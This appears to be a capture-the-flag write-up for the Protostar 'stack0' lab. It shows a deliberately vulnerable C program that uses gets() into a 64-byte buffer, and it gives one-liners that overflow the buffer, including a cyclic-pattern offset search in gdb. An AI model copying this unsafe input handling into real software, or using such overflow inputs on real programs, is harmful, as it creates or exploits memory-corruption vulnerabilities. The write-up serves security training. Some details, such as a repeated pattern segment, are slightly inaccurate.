##Source code - stack0.c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}

====

#Solution

-----------------
1) From source: |
-----------------

echo `python -c "print 'A' * 65"` | /opt/protostar/bin/stack0


---------------------------
2) From pattern to offset |
---------------------------

gdb -q ./stack0

perl -e 'print "a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9A"'

0x32634131 in ?? ()

Then take this value 0x32634131 and put it into some offset generating tool, for example pattern_offset included in metaspoit or feel free to
do it online here - http://projects.jason-rush.com/buffer-overflow-eip-offset-string-generator it's the same as in metasploit. You'll get
offset's value - 65. Now just print it.

perl -e 'print "\x90" * 65' | ./stack0
